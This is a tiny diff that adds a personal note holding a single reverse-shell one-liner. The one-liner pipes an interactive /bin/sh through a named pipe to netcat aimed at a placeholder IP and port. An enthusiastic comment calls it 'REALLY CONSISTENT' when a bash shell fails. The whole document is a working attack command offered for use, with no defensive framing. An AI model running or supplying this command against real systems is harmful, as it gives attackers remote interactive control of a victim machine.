@@ -1,0 +1,3 @@
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
+
+this one normally works if you cant get a bash shell to work!!! REALLY CONSISTENT
